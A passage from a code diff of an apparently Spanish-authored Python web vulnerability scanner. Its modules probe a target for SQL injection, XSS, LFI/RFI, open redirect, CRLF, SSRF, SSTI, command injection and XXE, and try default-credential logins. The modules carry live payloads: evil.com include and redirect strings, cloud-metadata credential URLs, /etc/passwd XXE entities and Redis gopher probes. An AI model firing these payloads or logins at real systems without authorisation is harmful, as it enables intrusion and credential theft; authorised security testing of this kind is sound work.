+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=15)
+            elapsed = time.time() - start
+            if elapsed >= 4.5:
+                log_vuln("CRITICAL", f"SQLi (time-based blind): param={param} delay={elapsed:.1f}s")
+                findings.append({"param": param, "type": "time-based", "delay": elapsed,
+                               "payload": sleep_payload, "severity": "CRITICAL"})
+                break
+
+        # POST-based SQLi
+        for payload in SQLI_PAYLOADS[:8]:
+            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                           data={param: payload})
+            if r:
+                body = r.text.lower()
+                for error in SQLI_ERRORS:
+                    if error in body:
+                        log_vuln("CRITICAL", f"SQLi POST (error-based): param={param}")
+                        findings.append({"param": param, "type": "post-error-based",
+                                       "payload": payload, "severity": "CRITICAL"})
+                        break
+
+    ctx["results"]["sqli"] = findings
+
+
+# =====================================================================
+#  MODULE 25: XSS PROBE (ENHANCED)
+# =====================================================================
+def mod_xss(ctx):
+    section_header("XSS PROBE (Enhanced)")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = list(ctx.get("_crawled_params", set()))
+    parsed = urlparse(url)
+    if parsed.query:
+        for k in parse_qs(parsed.query):
+            if k not in params:
+                params.append(k)
+    if not params:
+        params = ["search", "q", "query", "s", "name", "id", "redirect", "url", "page",
+                  "input", "text", "msg", "message", "comment"]
+
+    base = url.split("?")[0]
+    log_info(f"Probando {len(params)} parametros con {len(XSS_PAYLOADS)} payloads...")
+
+    for param in params:
+        # Reflection test first
+        canary = f"xss{random.randint(10000,99999)}test"
+        r = safe_request(session, "GET", f"{base}?{param}={canary}",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r or canary not in r.text:
+            continue
+
+        log_info(f"Parametro '{param}' refleja input - probando payloads...")
+
+        for payload in XSS_PAYLOADS:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+
+            # Check if payload is reflected unencoded
+            if payload in r.text:
+                log_vuln("HIGH", f"XSS reflejado: param={param} payload={payload[:50]}")
+                findings.append({"param": param, "type": "reflected", "payload": payload,
+                               "severity": "HIGH"})
+                break
+            # Check for partial reflection (tag not stripped)
+            if "<script" in payload and "<script" in r.text:
+                log_vuln("MEDIUM", f"XSS parcial (script tag no filtrado): param={param}")
+                findings.append({"param": param, "type": "partial", "payload": payload,
+                               "severity": "MEDIUM"})
+                break
+            if "onerror" in payload and "onerror" in r.text:
+                log_vuln("MEDIUM", f"XSS parcial (event handler no filtrado): param={param}")
+                findings.append({"param": param, "type": "partial-event", "payload": payload,
+                               "severity": "MEDIUM"})
+                break
+
+        # POST XSS
+        for payload in XSS_PAYLOADS[:5]:
+            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                           data={param: payload})
+            if r and payload in r.text:
+                log_vuln("HIGH", f"XSS POST reflejado: param={param}")
+                findings.append({"param": param, "type": "post-reflected", "payload": payload,
+                               "severity": "HIGH"})
+                break
+
+    # DOM XSS indicators
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if r:
+        dom_sinks = ["document.write(", "innerHTML", "outerHTML", "eval(", "setTimeout(",
+                     "setInterval(", "document.location", "window.location", "location.href",
+                     "location.hash", "location.search", "document.URL", "document.referrer",
+                     "document.cookie", "$.html(", "$.append("]
+        dom_sources = ["location.hash", "location.search", "location.href", "document.URL",
+                       "document.referrer", "window.name", "document.cookie"]
+        body = r.text
+        for sink in dom_sinks:
+            if sink in body:
+                log_vuln("LOW", f"DOM XSS sink encontrado: {sink}")
+                findings.append({"type": "dom-sink", "value": sink, "severity": "LOW"})
+
+    ctx["results"]["xss"] = findings
+
+
+# =====================================================================
+#  MODULE 26: LFI PROBE (ENHANCED)
+# =====================================================================
+def mod_lfi(ctx):
+    section_header("LFI PROBE (Enhanced)")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = ["file", "path", "page", "include", "dir", "document", "folder",
+              "root", "pg", "style", "template", "php_path", "doc", "view",
+              "content", "layout", "mod", "conf", "load", "read", "lang"]
+
+    base = url.split("?")[0]
+    lfi_indicators = ["root:", "/bin/", "daemon:", "nobody:", "[boot loader]",
+                      "[fonts]", "for 16-bit app support", "localhost",
+                      "PD9waH", "<?php", "<?=", "class ", "function "]
+
+    log_info(f"Probando {len(params)} parametros con {len(LFI_PAYLOADS)} payloads...")
+
+    for param in params:
+        for payload in LFI_PAYLOADS:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+
+            body = r.text
+            for indicator in lfi_indicators:
+                if indicator in body:
+                    sev = "CRITICAL" if "root:" in body or "/bin/" in body else "HIGH"
+                    log_vuln(sev, f"LFI: param={param} payload={payload[:50]}")
+                    log_info(f"  Indicador: {indicator}")
+                    findings.append({"param": param, "payload": payload,
+                                   "indicator": indicator, "severity": sev})
+                    break
+
+    ctx["results"]["lfi"] = findings
+
+
+# =====================================================================
+#  MODULE 27: RFI PROBE
+# =====================================================================
+def mod_rfi(ctx):
+    section_header("RFI PROBE")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = ["file", "path", "page", "include", "url", "document", "load",
+              "template", "src", "href", "fetch"]
+
+    base = url.split("?")[0]
+    # Payloads que no hacen requests reales pero detectan la vulnerabilidad
+    rfi_payloads = [
+        "//evil.com/shell.txt",
+        "https://evil.com/shell.txt%00",
+        "\\\\evil.com\\shell.txt",
+        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+        "php://input",
+        "expect://id",
+    ]
+
+    for param in params:
+        for payload in rfi_payloads:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if r and r.status_code == 200:
+                # Check if it tried to fetch the remote file (error messages)
+                body = r.text.lower()
+                rfi_indicators = ["failed to open stream", "include(http", "include(ftp",
+                                 "url file-access is disabled", "allow_url_include",
+                                 "failed opening", "wrapper is disabled"]
+                for ind in rfi_indicators:
+                    if ind in body:
+                        log_vuln("HIGH", f"RFI indicador: param={param} -> {ind}")
+                        findings.append({"param": param, "payload": payload,
+                                       "indicator": ind, "severity": "HIGH"})
+                        break
+
+    ctx["results"]["rfi"] = findings
+
+
+# =====================================================================
+#  MODULE 28: OPEN REDIRECT
+# =====================================================================
+def mod_open_redirect(ctx):
+    section_header("OPEN REDIRECT")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = ["redirect","url","next","return","rurl","redirect_url","return_url",
+              "goto","target","dest","destination","continue","callback",
+              "forward","out","view","ref","login_url","logout","r","u","link"]
+    payloads = [
+        "https://evil.com","//evil.com","///evil.com",
+        "/\\evil.com","////evil.com",
+        "https://evil.com%00.legit.com",
+        "https://evil.com?.legit.com",
+        "https://evil.com#.legit.com",
+        "https://evil.com\\.legit.com",
+        "https://evil.com@legit.com",
+        "javascript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "https://evil.com/%0d%0a",
+        "//evil%00.com",
+    ]
+
+    base = url.split("?")[0]
+    for param in params:
+        for payload in payloads:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                           allow_redirects=False)
+            if not r:
+                continue
+            if r.status_code in (301, 302, 303, 307, 308):
+                location = r.headers.get("Location", "")
+                if "evil.com" in location or location.startswith("//evil") or location.startswith("javascript:"):
+                    log_vuln("MEDIUM", f"Open Redirect: param={param} -> {location[:60]}")
+                    findings.append({"param": param, "payload": payload,
+                                   "redirect": location, "severity": "MEDIUM"})
+                    break
+
+    ctx["results"]["open_redirect"] = findings
+
+
+# =====================================================================
+#  MODULE 29: CRLF INJECTION
+# =====================================================================
+def mod_crlf(ctx):
+    section_header("CRLF INJECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    payloads = [
+        "%0d%0aX-Injected: CRLF",
+        "%0aX-Injected: CRLF",
+        "%0dX-Injected: CRLF",
+        "%E5%98%8A%E5%98%8DX-Injected: CRLF",
+        "\\r\\nX-Injected: CRLF",
+        "%0d%0a%0d%0a<script>alert(1)</script>",
+        "\r\nSet-Cookie: crlf=injected",
+        "%0d%0aSet-Cookie:%20crlf=injected",
+    ]
+
+    base = url.split("?")[0]
+    test_params = ["url","redirect","return","next","goto","path","page"]
+
+    for param in test_params:
+        for payload in payloads:
+            test_url = f"{base}?{param}={payload}"
+            r = safe_request(session, "GET", test_url, ctx["rate_limiter"],
+                           ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            headers_str = str(r.headers).lower()
+            if "x-injected" in headers_str or "crlf=injected" in headers_str:
+                log_vuln("HIGH", f"CRLF Injection: param={param}")
+                findings.append({"param": param, "payload": payload, "severity": "HIGH"})
+                break
+
+    ctx["results"]["crlf"] = findings
+
+
+# =====================================================================
+#  MODULE 30: HOST HEADER INJECTION
+# =====================================================================
+def mod_host_header(ctx):
     section_header("HOST HEADER INJECTION")
-
+    url = ctx["target_url"]
+    session = ctx["session"]
     findings = []
 
     tests = [
-        ("evil.com", "Arbitrary host"),
-        ("evil.com\r\nX-Injected: true", "CRLF in Host"),
-        (f"{get_domain(base_url)}@evil.com", "Host with @"),
-        (f"{get_domain(base_url)}.evil.com", "Subdomain append"),
-        (f"evil.com/{get_domain(base_url)}", "Host with path"),
+        {"Host": "evil.com"},
+        {"Host": f"{ctx['domain']}", "X-Forwarded-Host": "evil.com"},
+        {"Host": f"{ctx['domain']}", "X-Forwarded-Server": "evil.com"},
+        {"Host": f"{ctx['domain']}", "X-Original-URL": "/admin"},
+        {"Host": f"{ctx['domain']}", "X-Rewrite-URL": "/admin"},
+        {"Host": f"{ctx['domain']}\r\nX-Injected: true"},
     ]
 
-    override_headers = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server",
-                        "X-Original-URL", "X-Rewrite-URL"]
+    for test_headers in tests:
+        ctx["rate_limiter"].wait()
+        r = safe_request(session, "GET", url, headers=test_headers,
+                        rotate_ua=ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text.lower()
+        if "evil.com" in body or "evil.com" in str(r.headers).lower():
+            header_name = [k for k in test_headers if k != "Host"][0] if len(test_headers) > 1 else "Host"
+            log_vuln("MEDIUM", f"Host Header Injection via {header_name}")
+            findings.append({"header": header_name, "severity": "MEDIUM"})
 
-    for host_value, desc in tests:
-        try:
-            resp = safe_request(session, "GET", base_url, rate_limiter,
-                               headers={"Host": host_value}, timeout=5)
-            if resp:
-                if "evil.com" in resp.text or "evil.com" in resp.headers.get("Location", ""):
-                    findings.append({
-                        "type": desc,
-                        "host": host_value,
-                        "reflected_in": "body" if "evil.com" in resp.text else "Location header",
-                    })
-                    log_vuln("HIGH", f"Host header injection: {desc}")
-        except Exception:
-            pass
-
-    for header in override_headers:
-        resp = safe_request(session, "GET", base_url, rate_limiter,
-                           headers={header: "evil.com"}, timeout=5)
-        if resp and "evil.com" in resp.text:
-            findings.append({
-                "type": f"Override via {header}",
-                "header": header,
-            })
-            log_vuln("MEDIUM", f"Host override via {header}")
-
-    if not findings:
-        log_ok("No se detecto Host header injection.")
-
-    results["host_header"] = findings
+    ctx["results"]["host_header"] = findings
 
 
 # =====================================================================
-#  MODULE 21: SUBDOMAIN TAKEOVER VERIFY
+#  MODULE 31: SSRF DETECTION
 # =====================================================================
-def mod_takeover_verify(session, subdomains, rate_limiter, results):
-    """Verificacion de subdomain takeover."""
-    section_header("SUBDOMAIN TAKEOVER VERIFICATION")
+def mod_ssrf(ctx):
+    section_header("SSRF DETECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
 
-    takeover_sigs = {
-        "github.io": "There isn't a GitHub Pages site here",
-        "herokuapp.com": "no such app",
-        "pantheon.io": "404 error unknown site",
-        "tumblr.com": "There's nothing here",
-        "wordpress.com": "Do you want to register",
-        "teamwork.com": "Oops - We didn't find your site",
-        "helpjuice.com": "We could not find what you're looking for",
-        "helpscoutdocs.com": "No settings were found",
-        "ghost.io": "The thing you were looking for is no longer here",
-        "myshopify.com": "Sorry, this shop is currently unavailable",
-        "surge.sh": "project not found",
-        "bitbucket.io": "Repository not found",
-        "smartling.com": "Domain is not configured",
-        "acquia.com": "Web Site not found",
-        "fastly.com": "Fastly error: unknown domain",
-        "zendesk.com": "Help Center Closed",
-        "readme.io": "Project doesnt exist",
-        "statuspage.io": "Status page is not configured",
-        "uservoice.com": "This UserVoice subdomain",
-        "smugmug.com": "not found",
-        "cargocollective.com": "404 Not Found",
-        "unbounce.com": "The requested URL was not found",
-        "tilda.cc": "Please renew your subscription",
-        "webflow.io": "The page you are looking for doesn't exist",
-        "netlify.app": "Not Found - Request ID",
-        "fly.dev": "404 Not Found",
-        "vercel.app": "404: NOT_FOUND",
-        "render.com": "not found",
-    }
+    params = ["url","uri","path","dest","redirect","src","source","target",
+              "rurl","domain","feed","host","site","html","data","reference",
+              "page","load","fetch","file","link","img","image","proxy","callback"]
 
-    takeover_findings = []
+    ssrf_payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/v1/",
+        "http://100.100.100.200/latest/meta-data/",
+        "http://127.0.0.1:80","http://127.0.0.1:22","http://127.0.0.1:3306",
+        "http://localhost:80","http://0.0.0.0:80",
+        "http://[::1]:80","http://0177.0.0.1:80",
+        "http://2130706433:80",  # 127.0.0.1 as decimal
+        "http://017700000001:80",  # 127.0.0.1 as octal
+        "file:///etc/passwd",
+        "dict://127.0.0.1:6379/info",
+        "gopher://127.0.0.1:6379/_INFO",
+    ]
+
+    base = url.split("?")[0]
+    for param in params:
+        for payload in ssrf_payloads:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            body = r.text.lower()
+            ssrf_indicators = ["ami-id","instance-id","instance-type","availability-zone",
+                              "iam/security-credentials","compute/v1","meta-data",
+                              "root:","daemon:","redis_version","connected_clients",
+                              "127.0.0.1","localhost","internal","private"]
+            for ind in ssrf_indicators:
+                if ind in body:
+                    log_vuln("CRITICAL", f"SSRF: param={param} payload={payload[:50]} -> {ind}")
+                    findings.append({"param": param, "payload": payload,
+                                   "indicator": ind, "severity": "CRITICAL"})
+                    break
+
+        # POST SSRF
+        for payload in ssrf_payloads[:5]:
+            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                           data={param: payload})
+            if r:
+                body = r.text.lower()
+                for ind in ["ami-id","instance-id","root:","redis_version"]:
+                    if ind in body:
+                        log_vuln("CRITICAL", f"SSRF POST: param={param} -> {ind}")
+                        findings.append({"param": param, "payload": payload,
+                                       "type": "POST", "indicator": ind, "severity": "CRITICAL"})
+                        break
+
+    ctx["results"]["ssrf"] = findings
+
+
+# =====================================================================
+#  MODULE 32: SSTI DETECTION
+# =====================================================================
+def mod_ssti(ctx):
+    section_header("SSTI DETECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = list(ctx.get("_crawled_params", set())) or ["name","search","q","template","page","view","msg","text","input"]
+    base = url.split("?")[0]
+
+    log_info(f"Probando {len(params)} parametros con {len(SSTI_PAYLOADS)} payloads...")
+
+    for param in params:
+        for payload, expected in SSTI_PAYLOADS:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            if expected in r.text:
+                log_vuln("CRITICAL", f"SSTI: param={param} payload={payload[:40]} -> {expected}")
+                findings.append({"param": param, "payload": payload, "expected": expected,
+                               "severity": "CRITICAL"})
+                break
+
+    ctx["results"]["ssti"] = findings
+
+
+# =====================================================================
+#  MODULE 33: COMMAND INJECTION
+# =====================================================================
+def mod_cmdi(ctx):
+    section_header("COMMAND INJECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    params = ["cmd","command","exec","run","ping","ip","host","domain","target",
+              "query","search","input","data","dir","path","file"]
+    base = url.split("?")[0]
+
+    log_info(f"Probando {len(params)} parametros (time-based)...")
+
+    for param in params:
+        for payload, expected_delay in CMDI_PAYLOADS:
+            start = time.time()
+            r = safe_request(session, "GET", f"{base}?{param}=127.0.0.1{quote(payload)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=15)
+            elapsed = time.time() - start
+
+            if elapsed >= expected_delay * 0.8:
+                log_vuln("CRITICAL", f"Command Injection (time-based): param={param} delay={elapsed:.1f}s")
+                findings.append({"param": param, "payload": payload, "delay": elapsed,
+                               "severity": "CRITICAL"})
+                break
+
+            # Check for output-based
+            if r:
+                body = r.text
+                cmdi_indicators = ["uid=","gid=","groups=","root:","bin/","total ","drw",
+                                  "volume serial number","directory of","windows"]
+                for ind in cmdi_indicators:
+                    if ind in body.lower():
+                        log_vuln("CRITICAL", f"Command Injection (output): param={param} -> {ind}")
+                        findings.append({"param": param, "payload": payload,
+                                       "indicator": ind, "severity": "CRITICAL"})
+                        break
+
+    ctx["results"]["cmdi"] = findings
+
+
+# =====================================================================
+#  MODULE 34: XXE DETECTION
+# =====================================================================
+def mod_xxe(ctx):
+    section_header("XXE DETECTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Test endpoints that might accept XML
+    xml_endpoints = [url, f"{ctx['base_url']}/api", f"{ctx['base_url']}/upload",
+                     f"{ctx['base_url']}/import", f"{ctx['base_url']}/xmlrpc.php",
+                     f"{ctx['base_url']}/soap", f"{ctx['base_url']}/wsdl"]
+
+    xxe_payloads = [
+        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+         '<test>&xxe;</test>'),
+        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
+         '<test>&xxe;</test>'),
+        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
+         '<!ENTITY test "&#37;xxe;">]><test>&test;</test>'),
+    ]
+
+    content_types = ["application/xml", "text/xml", "application/soap+xml"]
+
+    for endpoint in xml_endpoints:
+        for payload in xxe_payloads:
+            for ct in content_types:
+                r = safe_request(session, "POST", endpoint, ctx["rate_limiter"],
+                               ctx["mode_config"]["rotate_ua"],
+                               data=payload, headers={"Content-Type": ct})
+                if not r:
+                    continue
+                body = r.text.lower()
+                if any(ind in body for ind in ["root:", "/bin/", "daemon:", "nobody:"]):
+                    log_vuln("CRITICAL", f"XXE: {endpoint}")
+                    findings.append({"endpoint": endpoint, "payload": payload[:60],
+                                   "severity": "CRITICAL"})
+                    break
+                # Check for XXE error indicators
+                if any(ind in body for ind in ["parser error", "entity", "dtd", "xml parsing"]):
+                    log_vuln("LOW", f"XXE: XML parser expuesto en {endpoint}")
+                    findings.append({"endpoint": endpoint, "type": "parser_exposed",
+                                   "severity": "LOW"})
+
+    ctx["results"]["xxe"] = findings
+
+
+# =====================================================================
+#  MODULE 35: HTTP PARAMETER POLLUTION
+# =====================================================================
+def mod_hpp(ctx):
+    section_header("HTTP PARAMETER POLLUTION")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    base = url.split("?")[0]
+    test_params = list(ctx.get("_crawled_params", set())) or ["id", "search", "q", "page", "user"]
+
+    for param in test_params[:10]:
+        # Send duplicate parameters with different values
+        r = safe_request(session, "GET", f"{base}?{param}=value1&{param}=value2",
+                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+
+        body = r.text
+        if "value1" in body and "value2" in body:
+            log_vuln("LOW", f"HPP: param={param} - ambos valores reflejados")
+            findings.append({"param": param, "type": "both_reflected", "severity": "LOW"})
+        elif "value2" in body and "value1" not in body:
+            log_info(f"HPP: param={param} - ultimo valor prevalece")
+        elif "value1" in body and "value2" not in body:
+            log_info(f"HPP: param={param} - primer valor prevalece")
+
+    ctx["results"]["hpp"] = findings
+
+
+# =====================================================================
+#  MODULE 36: SUBDOMAIN TAKEOVER
+# =====================================================================
+def mod_subdomain_takeover(ctx):
+    section_header("SUBDOMAIN TAKEOVER")
+    session = ctx["session"]
+    findings = []
+    subdomains = [s["subdomain"] for s in ctx["results"].get("subdomains", [])]
 
     if not subdomains:
         log_info("No hay subdominios para verificar.")
         return
 
-    log_info(f"Verificando {len(subdomains)} subdominios...")
+    takeover_signatures = {
+        "GitHub Pages": ["there isn't a github pages site here", "for root urls, please contact support"],
+        "Heroku": ["no such app", "herokucdn.com/error-pages", "no-such-app.html"],
+        "AWS S3": ["nosuchbucket", "the specified bucket does not exist"],
+        "Shopify": ["sorry, this shop is currently unavailable"],
+        "Tumblr": ["there's nothing here", "whatever you were looking for doesn't currently exist"],
+        "WordPress.com": ["do you want to register"],
+        "Fastly": ["fastly error: unknown domain"],
+        "Pantheon": ["404 error unknown site"],
+        "Zendesk": ["help center closed", "this help center no longer exists"],
+        "Surge.sh": ["project not found"],
+        "Fly.io": ["404 not found"],
+        "Netlify": ["not found - request id"],
+        "Bitbucket": ["repository not found"],
+        "Ghost": ["the thing you were looking for is no longer here"],
+        "Azure": ["the resource you are looking for has been removed"],
+        "Google Cloud": ["the requested url was not found"],
+        "Cargo": ["cargocollective.com/404"],
+        "Unbounce": ["the requested url was not found on this server"],
+    }
 
-    for sub_info in subdomains:
-        subdomain = sub_info.get("subdomain", "")
-        if not subdomain:
-            continue
-
+    for sub in subdomains:
+        ctx["rate_limiter"].wait()
         # Check CNAME
         try:
-            cname_answers = dns.resolver.resolve(subdomain, "CNAME") if dns else []
-            for cname in cname_answers:
-                cname_str = str(cname).rstrip(".")
-                for service, sig in takeover_sigs.items():
-                    if service in cname_str:
-                        # Try to access and verify
-                        for scheme in ["https", "http"]:
-                            try:
-                                resp = safe_request(session, "GET", f"{scheme}://{subdomain}",
-                                                   rate_limiter, timeout=5, allow_redirects=True)
-                                if resp and sig.lower() in resp.text.lower():
-                                    takeover_findings.append({
-                                        "subdomain": subdomain,
-                                        "cname": cname_str,
-                                        "service": service,
-                                        "signature": sig,
-                                    })
-                                    log_vuln("CRITICAL", f"Takeover posible: {subdomain} -> {cname_str}")
-                                    break
-                            except Exception:
-                                pass
-                        break
+            cname = None
+            if dns:
+                answers = dns.resolver.resolve(sub, "CNAME")
+                cname = str(answers[0].target).rstrip(".")
         except Exception:
             pass
 
-    if not takeover_findings:
-        log_ok("No se detectaron subdominios vulnerables a takeover.")
-
-    results["takeover"] = takeover_findings
-
-
-# =====================================================================
-#  MODULE 22: DEFAULT CREDENTIALS
-# =====================================================================
-def mod_default_creds(session, base_url, rate_limiter, results):
-    """Test de credenciales por defecto en paneles comunes."""
-    section_header("DEFAULT CREDENTIALS CHECK")
-
-    login_pages = [
-        ("/admin", "admin"),
-        ("/login", "login"),
-        ("/wp-login.php", "WordPress"),
-        ("/administrator/", "Joomla"),
-        ("/user/login", "Drupal"),
-        ("/phpmyadmin/", "phpMyAdmin"),
-        ("/manager/html", "Tomcat"),
-        ("/jenkins/login", "Jenkins"),
-    ]
-
-    found_logins = []
-    cred_findings = []
-
-    # Find login pages
-    for path, name in login_pages:
-        resp = safe_request(session, "GET", f"{base_url}{path}", rate_limiter)
-        if resp and resp.status_code == 200:
-            has_form = "<form" in resp.text.lower() and ("password" in resp.text.lower() or "login" in resp.text.lower())
-            if has_form:
-                found_logins.append({"path": path, "name": name})
-                log_ok(f"Login page encontrada: {path} ({name})")
-
-    if not found_logins:
-        log_info("No se encontraron paginas de login.")
-        results["default_creds"] = []
-        return
-
-    # Test default credentials on found login pages
-    log_info(f"Probando {len(DEFAULT_CREDS)} credenciales en {len(found_logins)} login pages...")
-
-    for login in found_logins:
-        path = login["path"]
-        url = f"{base_url}{path}"
-        resp = safe_request(session, "GET", url, rate_limiter, allow_redirects=True)
-        if not resp:
-            continue
-
-        # Find form fields
-        form_match = re.search(r'<form[^>]*>(.*?)</form>', resp.text, re.I | re.S)
-        if not form_match:
-            continue
-
-        form_html = form_match.group(1)
-        action = re.search(r'action=["\']([^"\']*)', resp.text, re.I)
-        action_url = urljoin(url, action.group(1)) if action else url
-
-        user_field = None
-        pass_field = None
-        extra_fields = {}
-
-        inputs = re.findall(r'<input[^>]*>', form_html, re.I)
-        for inp in inputs:
-            name_match = re.search(r'name=["\']([^"\']*)', inp, re.I)
-            type_match = re.search(r'type=["\']([^"\']*)', inp, re.I)
-            value_match = re.search(r'value=["\']([^"\']*)', inp, re.I)
-            if not name_match:
+        # Check HTTP response
+        for proto in ["https", "http"]:
+            r = safe_request(session, "GET", f"{proto}://{sub}", ctx["rate_limiter"],
+                           ctx["mode_config"]["rotate_ua"])
+            if not r:
+                if cname:
+                    # DNS resolves but HTTP fails - potential takeover
+                    log_vuln("MEDIUM", f"Posible takeover: {sub} (CNAME: {cname}, HTTP fallo)")
+                    findings.append({"subdomain": sub, "cname": cname, "type": "no_http"})
                 continue
-            name = name_match.group(1)
-            inp_type = type_match.group(1).lower() if type_match else "text"
-            value = value_match.group(1) if value_match else ""
 
-            if inp_type == "password":
-                pass_field = name
-            elif inp_type in ("text", "email") and not user_field:
-                user_field = name
-            elif inp_type == "hidden":
-                extra_fields[name] = value
+            body = r.text.lower()
+            for provider, sigs in takeover_signatures.items():
+                if any(s in body for s in sigs):
+                    log_vuln("HIGH", f"Subdomain Takeover: {sub} ({provider})")
+                    if cname:
+                        log_info(f"  CNAME: {cname}")
+                    findings.append({"subdomain": sub, "provider": provider,
+                                   "cname": cname, "severity": "HIGH"})
+                    break
+            break  # Only check one protocol
 
-        if not user_field or not pass_field:
+    ctx["results"]["subdomain_takeover"] = findings
+
+
+# =====================================================================
+#  MODULE 37: DEFAULT CREDENTIALS
+# =====================================================================
+def mod_default_creds(ctx):
+    section_header("DEFAULT CREDENTIALS")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
+
+    login_paths = ["admin","login","wp-login.php","administrator","user/login",
+                   "auth/login","manager/html","phpmyadmin","adminer.php",
+                   "webmail","cpanel","panel","dashboard/login","signin"]
+
+    for path in login_paths:
+        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
+                        ctx["mode_config"]["rotate_ua"])
+        if not r or r.status_code not in (200, 401):
             continue
 
-        for username, password in DEFAULT_CREDS[:10]:
-            data = extra_fields.copy()
-            data[user_field] = username
-            data[pass_field] = password
+        log_info(f"Login encontrado: /{path} - probando credenciales...")
 
-            login_resp = safe_request(session, "POST", action_url, rate_limiter,
-                                     data=data, allow_redirects=True)
-            if login_resp is None:
+        for user, pwd in DEFAULT_CREDS:
+            ctx["rate_limiter"].wait()
+            # Try POST
+            r = safe_request(session, "POST", f"{base}/{path}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                           data={"username": user, "password": pwd, "login": "Login",
+                                 "user": user, "pass": pwd, "log": user, "pwd": pwd},
+                           allow_redirects=True)
+            if not r:
                 continue
 
             # Check for successful login indicators
-            failed_indicators = ["invalid", "incorrect", "wrong", "failed", "error",
-                                "denied", "unauthorized", "bad credentials", "login failed"]
-            resp_lower = login_resp.text.lower()
+            body = r.text.lower()
+            success_indicators = ["dashboard","welcome","logout","sign out","profile",
+                                "admin panel","control panel","my account"]
+            fail_indicators = ["invalid","incorrect","wrong","error","failed","denied",
+                             "bad credentials","login failed"]
 
-            is_failed = any(ind in resp_lower for ind in failed_indicators)
-            is_redirect_to_dash = login_resp.url != action_url and "login" not in login_resp.url.lower()
-
-            if not is_failed and (is_redirect_to_dash or login_resp.status_code == 200):
-                if login_resp.url != url and "login" not in login_resp.url.lower():
-                    cred_findings.append({
-                        "url": url,
-                        "username": username,
-                        "password": password,
-                        "service": login["name"],
-                    })
-                    log_vuln("CRITICAL", f"Default creds: {username}:{password} en {login['name']}")
-                    break
-
-    if not cred_findings:
-        log_ok("No se encontraron credenciales por defecto.")
-
-    results["default_creds"] = cred_findings
-
-
-# =====================================================================
-#  MODULE 23: API DISCOVERY
-# =====================================================================
-def mod_api_discover(session, base_url, threads, rate_limiter, results):
-    """Descubrimiento de endpoints API."""
-    section_header("API DISCOVERY")
-
-    found_apis = []
-    lock = threading.Lock()
-
-    def check_api(path):
-        url = f"{base_url}/{path}"
-        resp = safe_request(session, "GET", url, rate_limiter, timeout=5)
-        if resp and resp.status_code in (200, 201, 204, 301, 302, 401, 403, 405):
-            ct = resp.headers.get("content-type", "")
-            is_json = "json" in ct or "xml" in ct
-            return {
-                "path": f"/{path}",
-                "status": resp.status_code,
-                "content_type": ct,
-                "is_api": is_json,
-                "size": len(resp.content),
-            }
-        return None
-
-    log_info(f"Probando {len(API_WORDLIST)} endpoints API...")
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(check_api, p): p for p in API_WORDLIST}
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                found_apis.append(result)
-                marker = " [API]" if result["is_api"] else ""
-                log_ok(f"[{result['status']}] {result['path']} ({result['content_type'][:30]}){marker}")
-
-    # Check for Swagger/OpenAPI
-    swagger_paths = ["swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
-                     "api-docs", "v2/api-docs", "v3/api-docs"]
-    for sp in swagger_paths:
-        resp = safe_request(session, "GET", f"{base_url}/{sp}", rate_limiter)
-        if resp and resp.status_code == 200:
